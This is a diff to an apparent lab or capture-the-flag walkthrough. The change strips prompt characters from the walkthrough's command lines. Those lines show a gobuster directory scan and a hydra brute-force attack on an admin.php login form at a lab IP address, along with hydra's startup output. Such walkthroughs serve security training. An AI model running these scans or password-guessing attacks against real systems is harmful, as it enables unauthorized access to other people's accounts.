@@ -261,7 +261,7 @@ Answer: -x php
 What page is found during our dir busting activities?
 
 ```
-└─# gobuster dir -u 10.129.197.200 -x php --wordlist /usr/share/wordlists/dirb/small.txt
+# gobuster dir -u 10.129.197.200 -x php --wordlist /usr/share/wordlists/dirb/small.txt
 ```
 
 The wordlist was taken from the default Kali install.
@@ -312,13 +312,13 @@ https://github.com/danielmiessler/SecLists/tree/master/Usernames
 
 Run the command
 ```
-└─# hydra -L /usr/share/wordlists/top-usernames-shortlist.txt -P /usr/share/john/password.lst 10.129.197.200 http-post-form "/admin.php:username=^USER^&password=^PASS^:Wrong username or password."
+# hydra -L /usr/share/wordlists/top-usernames-shortlist.txt -P /usr/share/john/password.lst 10.129.197.200 http-post-form "/admin.php:username=^USER^&password=^PASS^:Wrong username or password."
 ```
 
 and the results:
 
 ```
-└─# hydra -L /usr/share/wordlists/top-usernames-shortlist.txt -P /usr/share/john/password.lst 10.129.197.200 http-post-form "/admin.php:username=^USER^&password=^PASS^:Wrong username or password."
+# hydra -L /usr/share/wordlists/top-usernames-shortlist.txt -P /usr/share/john/password.lst 10.129.197.200 http-post-form "/admin.php:username=^USER^&password=^PASS^:Wrong username or password."
 Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-28 00:53:31
